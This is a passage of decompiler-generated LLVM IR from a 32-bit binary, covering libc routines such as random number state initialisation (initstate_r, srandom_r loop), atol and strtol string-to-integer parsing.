  %v0_804b1c128 = phi i32 [ %v0_804b1c4.pre, %dec_label_pc_804b19a.dec_label_pc_804b19a_crit_edge ], [ 1, %dec_label_pc_804b189 ]
  %v1_804b1a1 = ashr i32 %v0_804b19a, 31
  %v2_804b1a2 = zext i32 %v0_804b19a to i64
  %v4_804b1a2 = zext i32 %v1_804b1a1 to i64
  %v5_804b1a2 = mul nuw i64 %v4_804b1a2, 4294967296
  %v6_804b1a2 = or i64 %v5_804b1a2, %v2_804b1a2
  %v8_804b1a2 = sdiv i64 %v6_804b1a2, 127773
  %v9_804b1a2 = trunc i64 %v8_804b1a2 to i32
  %v10_804b1a2 = srem i64 %v6_804b1a2, 127773
  %v3_804b1a8 = mul nsw i64 %v10_804b1a2, 16807
  %v4_804b1a8 = trunc i64 %v3_804b1a8 to i32
  %v3_804b1ae = mul i32 %v9_804b1a2, 2836
  store i32 %v3_804b1ae, i32* %eax.global-to-local, align 4
  %v2_804b1b4 = sub i32 %v4_804b1a8, %v3_804b1ae
  %v13_804b1b4 = icmp slt i32 %v2_804b1b4, 0
  %v1_804b1b6 = icmp eq i1 %v13_804b1b4, false
  %v1_804b1b8 = add i32 %v2_804b1b4, 2147483647
  %v2_804b1b4.v1_804b1b8 = select i1 %v1_804b1b6, i32 %v2_804b1b4, i32 %v1_804b1b8
  store i32 %v2_804b1b4.v1_804b1b8, i32* %edx.global-to-local, align 4
  %v1_804b1be = add i32 %v0_804b1be, 4
  store i32 %v1_804b1be, i32* %ecx.global-to-local, align 4
  %v1_804b1c1 = add i32 %v0_804b1c128, 1
  store i32 %v1_804b1c1, i32* @edi, align 4
  %v2_804b1c2 = inttoptr i32 %v1_804b1be to i32*
  store i32 %v2_804b1b4.v1_804b1b8, i32* %v2_804b1c2, align 4
  %v0_804b1c4.pre = load i32, i32* @edi, align 4
  %v3_804b1c4.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t12 = trunc i64 %v3_804b1c4.pre to i32
  %v5_804b1c7 = icmp slt i32 %v0_804b1c4.pre, %extract.t12
  br i1 %v5_804b1c7, label %dec_label_pc_804b19a.dec_label_pc_804b19a_crit_edge, label %dec_label_pc_804b1c4.dec_label_pc_804b1c9_crit_edge

dec_label_pc_804b19a.dec_label_pc_804b19a_crit_edge: ; preds = %dec_label_pc_804b19a
  %v0_804b19a.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_804b1be.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804b19a

dec_label_pc_804b1c4.dec_label_pc_804b1c9_crit_edge: ; preds = %dec_label_pc_804b19a
  %v0_804b1c9.pre = load i32, i32* @esi, align 4
  %v0_804b1cc.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b1c9

dec_label_pc_804b1c9:                             ; preds = %dec_label_pc_804b1c4.dec_label_pc_804b1c9_crit_edge, %dec_label_pc_804b189
  %v0_804b1cc = phi i32 [ %v0_804b1cc.pre, %dec_label_pc_804b1c4.dec_label_pc_804b1c9_crit_edge ], [ %v0_804b18b, %dec_label_pc_804b189 ]
  %v0_804b1c9 = phi i32 [ %v0_804b1c9.pre, %dec_label_pc_804b1c4.dec_label_pc_804b1c9_crit_edge ], [ %v0_804b18d, %dec_label_pc_804b189 ]
  %v1_804b1c9 = add i32 %v0_804b1c9, 20
  %v2_804b1c9 = inttoptr i32 %v1_804b1c9 to i32*
  %v3_804b1c9 = load i32, i32* %v2_804b1c9, align 4
  store i32 %v3_804b1c9, i32* %eax.global-to-local, align 4
  %v2_804b1cc = add i32 %v0_804b1c9, 4
  %v3_804b1cc = inttoptr i32 %v2_804b1cc to i32*
  store i32 %v0_804b1cc, i32* %v3_804b1cc, align 4
  %v0_804b1cf = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b1cf = load i32, i32* %eax.global-to-local, align 4
  %v2_804b1cf = mul i32 %v1_804b1cf, 4
  %v3_804b1cf = add i32 %v2_804b1cf, %v0_804b1cf
  store i32 %v3_804b1cf, i32* %eax.global-to-local, align 4
  %v1_804b1d2 = load i32, i32* @esi, align 4
  %v2_804b1d2 = inttoptr i32 %v1_804b1d2 to i32*
  store i32 %v3_804b1cf, i32* %v2_804b1d2, align 4
  %v3_804b1d4 = load i64, i64* %stack_var_-40, align 8
  %v6_804b1d4 = mul nsw i64 %v3_804b1d4, 10
  %v7_804b1d4 = trunc i64 %v6_804b1d4 to i32
  %v2_804b1da = ptrtoint i32* %stack_var_-20 to i32
  %v1_804b1e724 = add i32 %v7_804b1d4, -1
  %v9_804b1e725 = icmp slt i32 %v1_804b1e724, 0
  store i32 %v1_804b1e724, i32* @ebx, align 4
  %v1_804b1e826 = icmp eq i1 %v9_804b1e725, false
  br i1 %v1_804b1e826, label %dec_label_pc_804b1da, label %dec_label_pc_804b1ea

dec_label_pc_804b1da:                             ; preds = %dec_label_pc_804b1c9, %dec_label_pc_804b1da
  store i32 %v2_804b1da, i32* %eax.global-to-local, align 4
  %v0_804b1df = load i32, i32* @esi, align 4
  %v2_804b1e0 = inttoptr i32 %v0_804b1df to i32*
  %v3_804b1e0 = call i32 @__GI_random_r(i32* %v2_804b1e0, i32 %v2_804b1da)
  store i32 %v0_804b1df, i32* %eax.global-to-local, align 4
  store i32 %v2_804b1da, i32* %edx.global-to-local, align 4
  %v0_804b1e7.pre = load i32, i32* @ebx, align 4
  %v1_804b1e7 = add i32 %v0_804b1e7.pre, -1
  %v9_804b1e7 = icmp slt i32 %v1_804b1e7, 0
  store i32 %v1_804b1e7, i32* @ebx, align 4
  %v1_804b1e8 = icmp eq i1 %v9_804b1e7, false
  br i1 %v1_804b1e8, label %dec_label_pc_804b1da, label %dec_label_pc_804b1ea

dec_label_pc_804b1ea:                             ; preds = %dec_label_pc_804b1c9, %dec_label_pc_804b1da, %dec_label_pc_804b183
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804b1ec

dec_label_pc_804b1ec:                             ; preds = %entry, %dec_label_pc_804b1ea
  %v0_804b1ef = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_804b1ea ]
  store i32 %v0_804b1ef, i32* %eax.global-to-local, align 4
  store i32 %v0_804b163, i32* @ebx, align 4
  store i32 %v0_804b162, i32* @esi, align 4
  store i32 %v0_804b161, i32* @edi, align 4
  store i32 %v0_804b160, i32* @ebp, align 4
  ret i32 %v0_804b1ef

; uselistorder directives
  uselistorder i32 %v0_804b1ef, { 1, 0 }
  uselistorder i32 %v1_804b1e7, { 1, 0 }
  uselistorder i32 %v0_804b1c9, { 1, 0 }
  uselistorder i32 %v0_804b1c4.pre, { 1, 0 }
  uselistorder i32 %v2_804b1b4.v1_804b1b8, { 1, 0 }
  uselistorder i32 %v0_804b19a, { 1, 0 }
  uselistorder i32 %v0_804b18b, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i32 (i32*, i32)* @__GI_random_r, { 1, 0 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804b1ec, { 1, 0 }
  uselistorder label %dec_label_pc_804b1ea, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b1da, { 1, 0 }
  uselistorder label %dec_label_pc_804b19a, { 1, 0 }
  uselistorder label %dec_label_pc_804b183, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_804b1f9 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_804b21a, label %dec_label_pc_804b20e

dec_label_pc_804b20e:                             ; preds = %entry
  %v2_804b20e = icmp ult i32 %arg3, 256
  %v1_804b215 = select i1 %v2_804b20e, i32 5, i32 4
  store i32 %v1_804b215, i32* @ebx, align 4
  br label %dec_label_pc_804b230

dec_label_pc_804b21a:                             ; preds = %entry
  %v6_804b21d = icmp ugt i32 %arg3, 31
  br i1 %v6_804b21d, label %dec_label_pc_804b228, label %dec_label_pc_804b21f

dec_label_pc_804b21f:                             ; preds = %dec_label_pc_804b21a
  store i32 0, i32* @ebx, align 4
  %v6_804b224 = icmp ugt i32 %arg3, 7
  br i1 %v6_804b224, label %dec_label_pc_804b230, label %dec_label_pc_804b280

dec_label_pc_804b228:                             ; preds = %dec_label_pc_804b21a
  %v2_804b228 = icmp ult i32 %arg3, 64
  %v1_804b22d = select i1 %v2_804b228, i32 3, i32 2
  store i32 %v1_804b22d, i32* @ebx, align 4
  br label %dec_label_pc_804b230

dec_label_pc_804b230:                             ; preds = %dec_label_pc_804b21f, %dec_label_pc_804b20e, %dec_label_pc_804b228
  %v0_804b230 = phi i32 [ 0, %dec_label_pc_804b21f ], [ %v1_804b215, %dec_label_pc_804b20e ], [ %v1_804b22d, %dec_label_pc_804b228 ]
  %v1_804b230 = mul nuw nsw i32 %v0_804b230, 4
  %v2_804b230 = add i32 %v1_804b230, ptrtoint (i32* @global_var_8050354.64 to i32)
  %v3_804b230 = inttoptr i32 %v2_804b230 to i32*
  %v4_804b230 = load i32, i32* %v3_804b230, align 4
  store i32 %v4_804b230, i32* %eax.global-to-local, align 4
  %v1_804b237 = add i32 %tmp7, 4
  store i32 %v1_804b237, i32* @esi, align 4
  %v2_804b23a = add i32 %arg4, 16
  %v3_804b23a = inttoptr i32 %v2_804b23a to i32*
  store i32 %v4_804b230, i32* %v3_804b23a, align 4
  %v0_804b23d = load i32, i32* @ebx, align 4
  %v1_804b23d = mul i32 %v0_804b23d, 4
  %v2_804b23d = add i32 %v1_804b23d, ptrtoint (i32* @global_var_8050340.65 to i32)
  %v3_804b23d = inttoptr i32 %v2_804b23d to i32*
  %v4_804b23d = load i32, i32* %v3_804b23d, align 4
  store i32 %v4_804b23d, i32* %edx.global-to-local, align 4
  %v0_804b244 = load i32, i32* @esi, align 4
  %v1_804b244 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b244 = mul i32 %v1_804b244, 4
  %v3_804b244 = add i32 %v2_804b244, %v0_804b244
  store i32 %v3_804b244, i32* %eax.global-to-local, align 4
  %v1_804b247 = load i32, i32* @edi, align 4
  %v2_804b247 = add i32 %v1_804b247, 12
  %v3_804b247 = inttoptr i32 %v2_804b247 to i32*
  store i32 %v0_804b23d, i32* %v3_804b247, align 4
  %v0_804b24a = load i32, i32* %edx.global-to-local, align 4
  %v1_804b24a = load i32, i32* @edi, align 4
  %v2_804b24a = add i32 %v1_804b24a, 20
  %v3_804b24a = inttoptr i32 %v2_804b24a to i32*
  store i32 %v0_804b24a, i32* %v3_804b24a, align 4
  %v0_804b24d = load i32, i32* %eax.global-to-local, align 4
  %v1_804b24d = load i32, i32* @edi, align 4
  %v2_804b24d = add i32 %v1_804b24d, 24
  %v3_804b24d = inttoptr i32 %v2_804b24d to i32*
  store i32 %v0_804b24d, i32* %v3_804b24d, align 4
  %v0_804b250 = load i32, i32* @esi, align 4
  %v1_804b250 = load i32, i32* @edi, align 4
  %v2_804b250 = add i32 %v1_804b250, 8
  %v3_804b250 = inttoptr i32 %v2_804b250 to i32*
  store i32 %v0_804b250, i32* %v3_804b250, align 4
  %v0_804b253 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_804b258 = sext i32 %arg1 to i64
  %v3_804b258 = call i32 @srandom_r(i64 %v2_804b258, i32 %v0_804b253)
  %v0_804b25d = load i32, i32* @ebp, align 4
  %v1_804b25d = inttoptr i32 %v0_804b25d to i32*
  store i32 0, i32* %v1_804b25d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804b268 = load i32, i32* @ebx, align 4
  %v1_804b268 = icmp eq i32 %v0_804b268, 0
  br i1 %v1_804b268, label %dec_label_pc_804b299, label %dec_label_pc_804b26c

dec_label_pc_804b26c:                             ; preds = %dec_label_pc_804b230
  %v0_804b26c = load i32, i32* @edi, align 4
  %v1_804b26c = add i32 %v0_804b26c, 4
  %v2_804b26c = inttoptr i32 %v1_804b26c to i32*
  %v3_804b26c = load i32, i32* %v2_804b26c, align 4
  %v1_804b26f = load i32, i32* @esi, align 4
  %v2_804b26f = sub i32 %v3_804b26c, %v1_804b26f
  %v2_804b271 = sdiv i32 %v2_804b26f, 4
  %v3_804b274 = mul i32 %v2_804b271, 5
  %v2_804b277 = add i32 %v3_804b274, %v0_804b268
  %v1_804b279 = load i32, i32* @ebp, align 4
  %v2_804b279 = inttoptr i32 %v1_804b279 to i32*
  store i32 %v2_804b277, i32* %v2_804b279, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b299

dec_label_pc_804b280:                             ; preds = %dec_label_pc_804b21f
  %v1_804b280 = call i32 @__errno_location(i32 %v0_804b1f9)
  store i32 %v1_804b280, i32* %eax.global-to-local, align 4
  %v1_804b285 = inttoptr i32 %v1_804b280 to i32*
  store i32 22, i32* %v1_804b285, align 4
  %v0_804b28b = load i32, i32* %stack_var_-36, align 4
  %v1_804b28b = call i32 @__errno_location(i32 %v0_804b28b)
  %v1_804b290 = inttoptr i32 %v1_804b28b to i32*
  store i32 22, i32* %v1_804b290, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b299

dec_label_pc_804b299:                             ; preds = %dec_label_pc_804b230, %dec_label_pc_804b26c, %dec_label_pc_804b280
  %v0_804b2a0 = phi i32 [ 0, %dec_label_pc_804b230 ], [ 0, %dec_label_pc_804b26c ], [ -1, %dec_label_pc_804b280 ]
  ret i32 %v0_804b2a0

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b299, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b230, { 2, 0, 1 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804b2af = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_804b2af
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804b2c9 = inttoptr i32 %arg1 to i8*
  %v5_804b2c9 = call i32 @_stdlib_strto_l(i8* %v4_804b2c9, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_804b2c9
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_804b2d7 = load i32, i32* @ebx, align 4
  store i32 %v0_804b2d7, i32* %stack_var_-16, align 4
  %v0_804b2db = load i32, i32* @global_var_8052038, align 8
  %v4_804b2e1 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b2e1, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_804b2e1, i32* %ebx.global-to-local, align 4
  %v2_804b2ee41 = load i8, i8* %arg1, align 1
  %v3_804b2ee42 = sext i8 %v2_804b2ee41 to i32
  store i32 %v3_804b2ee42, i32* %eax.global-to-local, align 4
  %v2_804b2f143 = mul nsw i32 %v3_804b2ee42, 2
  %v3_804b2f144 = add i32 %v2_804b2f143, %v0_804b2db
  %v4_804b2f145 = inttoptr i32 %v3_804b2f144 to i8*
  %v5_804b2f146 = load i8, i8* %v4_804b2f145, align 1
  %v6_804b2f147 = and i8 %v5_804b2f146, 32
  %v7_804b2f148 = icmp eq i8 %v6_804b2f147, 0
  %v1_804b2f549 = icmp eq i1 %v7_804b2f148, false
  br i1 %v1_804b2f549, label %dec_label_pc_804b2ed, label %dec_label_pc_804b2f7

dec_label_pc_804b2ed:                             ; preds = %entry, %dec_label_pc_804b2ed
  %v0_804b2ed50 = phi i32 [ %v1_804b2ed, %dec_label_pc_804b2ed ], [ %v4_804b2e1, %entry ]
  %v1_804b2ed = add i32 %v0_804b2ed50, 1
  store i32 %v1_804b2ed, i32* %ebx.global-to-local, align 4
  %v1_804b2ee = inttoptr i32 %v1_804b2ed to i8*
  %v2_804b2ee = load i8, i8* %v1_804b2ee, align 1
  %v3_804b2ee = sext i8 %v2_804b2ee to i32
  store i32 %v3_804b2ee, i32* %eax.global-to-local, align 4
  %v2_804b2f1 = mul nsw i32 %v3_804b2ee, 2
  %v3_804b2f1 = add i32 %v2_804b2f1, %v0_804b2db
  %v4_804b2f1 = inttoptr i32 %v3_804b2f1 to i8*
  %v5_804b2f1 = load i8, i8* %v4_804b2f1, align 1
  %v6_804b2f1 = and i8 %v5_804b2f1, 32
  %v7_804b2f1 = icmp eq i8 %v6_804b2f1, 0
  %v1_804b2f5 = icmp eq i1 %v7_804b2f1, false
  br i1 %v1_804b2f5, label %dec_label_pc_804b2ed, label %dec_label_pc_804b2f7

dec_label_pc_804b2f7:                             ; preds = %dec_label_pc_804b2ed, %entry
  %v0_804b2ed.lcssa = phi i32 [ %v4_804b2e1, %entry ], [ %v1_804b2ed, %dec_label_pc_804b2ed ]
  %v2_804b2ee.lcssa = phi i8 [ %v2_804b2ee41, %entry ], [ %v2_804b2ee, %dec_label_pc_804b2ed ]
  %v3_804b2ee.lcssa = phi i32 [ %v3_804b2ee42, %entry ], [ %v3_804b2ee, %dec_label_pc_804b2ed ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_804b2f7 = icmp eq i8 %v2_804b2ee.lcssa, 43
  br i1 %v9_804b2f7, label %dec_label_pc_804b30c, label %dec_label_pc_804b2fc

dec_label_pc_804b2fc:                             ; preds = %dec_label_pc_804b2f7
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_804b2fe = icmp eq i8 %v2_804b2ee.lcssa, 45
  %v1_804b301 = icmp eq i1 %v9_804b2fe, false
  br i1 %v1_804b301, label %dec_label_pc_804b30d, label %dec_label_pc_804b30c

dec_label_pc_804b30c:                             ; preds = %dec_label_pc_804b2f7, %dec_label_pc_804b2fc
  %storemerge3 = phi i32 [ 1, %dec_label_pc_804b2fc ], [ 0, %dec_label_pc_804b2f7 ]
  store i32 %storemerge3, i32* %ebp.global-to-local, align 4
  %v1_804b30c = add i32 %v0_804b2ed.lcssa, 1
  store i32 %v1_804b30c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b30d

dec_label_pc_804b30d:                             ; preds = %dec_label_pc_804b2fc, %dec_label_pc_804b30c
  %v0_804b31f = phi i32 [ %v0_804b2ed.lcssa, %dec_label_pc_804b2fc ], [ %v1_804b30c, %dec_label_pc_804b30c ]
  %v1_804b30f = and i32 %arg3, -17
  %v2_804b30f = icmp eq i32 %v1_804b30f, 0
  %v1_804b315 = icmp eq i1 %v2_804b30f, false
  br i1 %v1_804b315, label %dec_label_pc_804b33b, label %dec_label_pc_804b317

dec_label_pc_804b317:                             ; preds = %dec_label_pc_804b30d
  %v1_804b317 = add i32 %arg3, 10
  store i32 %v1_804b317, i32* %esi.global-to-local, align 4
  %v1_804b31a = inttoptr i32 %v0_804b31f to i8*
  %v2_804b31a = load i8, i8* %v1_804b31a, align 1
  %v8_804b31a = icmp eq i8 %v2_804b31a, 48
  %v1_804b31d = icmp eq i1 %v8_804b31a, false
  br i1 %v1_804b31d, label %dec_label_pc_804b331, label %dec_label_pc_804b31f

dec_label_pc_804b31f:                             ; preds = %dec_label_pc_804b317
  %v1_804b31f = add i32 %v0_804b31f, 1
  store i32 %v1_804b31f, i32* %ebx.global-to-local, align 4
  %v1_804b320 = add i32 %arg3, 8
  store i32 %v1_804b320, i32* %esi.global-to-local, align 4
  %v1_804b325 = inttoptr i32 %v1_804b31f to i8*
  %v2_804b325 = load i8, i8* %v1_804b325, align 1
  %v3_804b325 = zext i8 %v2_804b325 to i32
  %v5_804b325 = and i32 %v3_804b2ee.lcssa, -256
  %v6_804b325 = or i32 %v5_804b325, %v3_804b325
  %v1_804b327 = or i32 %v6_804b325, 32
  %v3_804b327 = trunc i32 %v1_804b327 to i8
  store i32 %v1_804b327, i32* %eax.global-to-local, align 4
  %v10_804b32a = icmp eq i8 %v3_804b327, 120
  %v1_804b32c = icmp eq i1 %v10_804b32a, false
  br i1 %v1_804b32c, label %dec_label_pc_804b331, label %dec_label_pc_804b32e

dec_label_pc_804b32e:                             ; preds = %dec_label_pc_804b31f
  %v2_804b32e = mul i32 %v1_804b320, 2
  store i32 %v2_804b32e, i32* %esi.global-to-local, align 4
  %v1_804b330 = add i32 %v0_804b31f, 2
  store i32 %v1_804b330, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b331

dec_label_pc_804b331:                             ; preds = %dec_label_pc_804b31f, %dec_label_pc_804b317, %dec_label_pc_804b32e
  %v0_804b35a12 = phi i32 [ %v1_804b31f, %dec_label_pc_804b31f ], [ %v0_804b31f, %dec_label_pc_804b317 ], [ %v1_804b330, %dec_label_pc_804b32e ]
  %v0_804b3b120 = phi i32 [ %v1_804b31f, %dec_label_pc_804b31f ], [ %v4_804b2e1, %dec_label_pc_804b317 ], [ %v1_804b31f, %dec_label_pc_804b32e ]
  %v0_804b331 = phi i32 [ %v1_804b320, %dec_label_pc_804b31f ], [ %v1_804b317, %dec_label_pc_804b317 ], [ %v2_804b32e, %dec_label_pc_804b32e ]
  %v7_804b334 = icmp sgt i32 %v0_804b331, 16
  br i1 %v7_804b334, label %dec_label_pc_804b336, label %dec_label_pc_804b33b

dec_label_pc_804b336:                             ; preds = %dec_label_pc_804b331
  store i32 16, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804b33b

dec_label_pc_804b33b:                             ; preds = %dec_label_pc_804b331, %dec_label_pc_804b30d, %dec_label_pc_804b336
  %v0_804b3b121 = phi i32 [ %v0_804b3b120, %dec_label_pc_804b331 ], [ %v4_804b2e1, %dec_label_pc_804b30d ], [ %v0_804b3b120, %dec_label_pc_804b336 ]
  %v0_804b35a13 = phi i32 [ %v0_804b35a12, %dec_label_pc_804b331 ], [ %v0_804b31f, %dec_label_pc_804b30d ], [ %v0_804b35a12, %dec_label_pc_804b336 ]
  %v0_804b34a = phi i32 [ %v0_804b331, %dec_label_pc_804b331 ], [ %arg3, %dec_label_pc_804b30d ], [ 16, %dec_label_pc_804b336 ]
  %v1_804b33b = add i32 %v0_804b34a, -2
  store i32 %v1_804b33b, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v6_804b343 = icmp ugt i32 %v1_804b33b, 34
  br i1 %v6_804b343, label %dec_label_pc_804b3a6, label %dec_label_pc_804b345

dec_label_pc_804b345:                             ; preds = %dec_label_pc_804b33b
  %div = udiv i32 -1, %v0_804b34a
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_804b34a
  %v1_804b34c = trunc i32 %tmp38 to i8
  store i32 0, i32* @edx, align 4
  %v4_804b386 = urem i32 %arg4, 256
  br label %dec_label_pc_804b35a

dec_label_pc_804b358:                             ; preds = %dec_label_pc_804b39c, %dec_label_pc_804b386
  %v4_804b35a.pre = phi i32 [ %v1_804b370, %dec_label_pc_804b39c ], [ %v4_804b35a.pre.pre, %dec_label_pc_804b386 ]
  %v0_804b358 = phi i32 [ %v1_804b377, %dec_label_pc_804b39c ], [ %v0_804b358.pre, %dec_label_pc_804b386 ]
  br label %dec_label_pc_804b35a

dec_label_pc_804b35a:                             ; preds = %dec_label_pc_804b345, %dec_label_pc_804b358
  %v0_804b3b119 = phi i32 [ %v0_804b3b121, %dec_label_pc_804b345 ], [ %v0_804b358, %dec_label_pc_804b358 ]
  %v0_804b377 = phi i32 [ %v0_804b35a13, %dec_label_pc_804b345 ], [ %v0_804b358, %dec_label_pc_804b358 ]
  %v4_804b35a = phi i32 [ %div, %dec_label_pc_804b345 ], [ %v4_804b35a.pre, %dec_label_pc_804b358 ]
  %v1_804b35a = inttoptr i32 %v0_804b377 to i8*
  %v2_804b35a = load i8, i8* %v1_804b35a, align 1
  %v3_804b35a = zext i8 %v2_804b35a to i32
  %v5_804b35a = and i32 %v4_804b35a, -256
  %v6_804b35a = or i32 %v3_804b35a, %v5_804b35a
  store i32 %v6_804b35a, i32* %eax.global-to-local, align 4
  %v1_804b35c = add i32 %v6_804b35a, -48
  store i32 %v1_804b35c, i32* @ecx, align 4
  %v1_804b35f = trunc i32 %v1_804b35c to i8
  %tmp55 = icmp ult i8 %v1_804b35f, 10
  br i1 %tmp55, label %dec_label_pc_804b370, label %dec_label_pc_804b364

dec_label_pc_804b364:                             ; preds = %dec_label_pc_804b35a
  %v1_804b364 = or i32 %v6_804b35a, 32
  %v3_804b364 = trunc i32 %v1_804b364 to i8
  store i32 %v1_804b364, i32* %eax.global-to-local, align 4
  %v1_804b367 = and i32 %v1_804b35c, -256
  %v2_804b367 = or i32 %v1_804b367, 40
  store i32 %v2_804b367, i32* @ecx, align 4
  %tmp56 = icmp ult i8 %v3_804b364, 97
  br i1 %tmp56, label %dec_label_pc_804b370, label %dec_label_pc_804b36d

dec_label_pc_804b36d:                             ; preds = %dec_label_pc_804b364
  %v1_804b36d = add i32 %v1_804b364, -87
  store i32 %v1_804b36d, i32* @ecx, align 4
  br label %dec_label_pc_804b370

dec_label_pc_804b370:                             ; preds = %dec_label_pc_804b364, %dec_label_pc_804b35a, %dec_label_pc_804b36d
  %v0_804b39f = phi i32 [ %v2_804b367, %dec_label_pc_804b364 ], [ %v1_804b35c, %dec_label_pc_804b35a ], [ %v1_804b36d, %dec_label_pc_804b36d ]
  %v1_804b370 = urem i32 %v0_804b39f, 256
  store i32 %v1_804b370, i32* %eax.global-to-local, align 4
  %v1_804b373 = load i32, i32* %esi.global-to-local, align 4
  %v2_804b373 = sub i32 %v1_804b370, %v1_804b373
  %v10_804b373 = and i32 %v2_804b373, %v1_804b373
  %v11_804b373 = icmp slt i32 %v10_804b373, 0
  %v13_804b373 = icmp slt i32 %v2_804b373, 0
  %v2_804b375 = icmp eq i1 %v13_804b373, %v11_804b373
  br i1 %v2_804b375, label %dec_label_pc_804b3a6, label %dec_label_pc_804b377

dec_label_pc_804b377:                             ; preds = %dec_label_pc_804b370
  %v1_804b377 = add i32 %v0_804b377, 1
  store i32 %v1_804b377, i32* %ebx.global-to-local, align 4
  %v0_804b378 = load i32, i32* @edx, align 4
  %tmp57 = icmp ugt i32 %v0_804b378, %div
  br i1 %tmp57, label %dec_label_pc_804b386, label %dec_label_pc_804b37e

dec_label_pc_804b37e:                             ; preds = %dec_label_pc_804b377
  %v15_804b378 = icmp eq i32 %v0_804b378, %div
  %v1_804b37e = icmp eq i1 %v15_804b378, false
  br i1 %v1_804b37e, label %dec_label_pc_804b39c, label %dec_label_pc_804b380

dec_label_pc_804b380:                             ; preds = %dec_label_pc_804b37e
  %v1_804b380 = trunc i32 %v0_804b39f to i8
  %tmp58 = icmp ugt i8 %v1_804b380, %v1_804b34c
  br i1 %tmp58, label %dec_label_pc_804b386, label %dec_label_pc_804b39c

dec_label_pc_804b386:                             ; preds = %dec_label_pc_804b380, %dec_label_pc_804b377
  store i32 %v4_804b386, i32* %eax.global-to-local, align 4
  %v0_804b38a = load i32, i32* %ebp.global-to-local, align 4
  %v2_804b38a = and i32 %v0_804b38a, %v4_804b386
  store i32 %v2_804b38a, i32* %ebp.global-to-local, align 4
  %v1_804b38c = call i32 @__errno_location(i32 %div)
  store i32 %v1_804b38c, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v1_804b394 = inttoptr i32 %v1_804b38c to i32*
  store i32 34, i32* %v1_804b394, align 4
  %v0_804b358.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_804b35a.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b358

dec_label_pc_804b39c:                             ; preds = %dec_label_pc_804b380, %dec_label_pc_804b37e
  %v4_804b39c = mul i32 %v0_804b378, %v1_804b373
  store i32 %v1_804b370, i32* %eax.global-to-local, align 4
  %v2_804b3a2 = add i32 %v4_804b39c, %v1_804b370
  store i32 %v2_804b3a2, i32* @edx, align 4
  br label %dec_label_pc_804b358

dec_label_pc_804b3a6:                             ; preds = %dec_label_pc_804b370, %dec_label_pc_804b33b
  %v0_804b3b1 = phi i32 [ %v0_804b3b121, %dec_label_pc_804b33b ], [ %v0_804b3b119, %dec_label_pc_804b370 ]
  %stack_var_-24.0 = phi i32 [ %tmp27, %dec_label_pc_804b33b ], [ %div, %dec_label_pc_804b370 ]
  %v4_804b3a6 = icmp eq i32 %arg2, 0
  br i1 %v4_804b3a6, label %dec_label_pc_804b3b3, label %dec_label_pc_804b3ad

dec_label_pc_804b3ad:                             ; preds = %dec_label_pc_804b3a6
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804b3b1 = inttoptr i32 %arg2 to i32*
  store i32 %v0_804b3b1, i32* %v2_804b3b1, align 4
  br label %dec_label_pc_804b3b3

dec_label_pc_804b3b3:                             ; preds = %dec_label_pc_804b3a6, %dec_label_pc_804b3ad
  %v0_804b3b3 = load i32, i32* %ebp.global-to-local, align 4
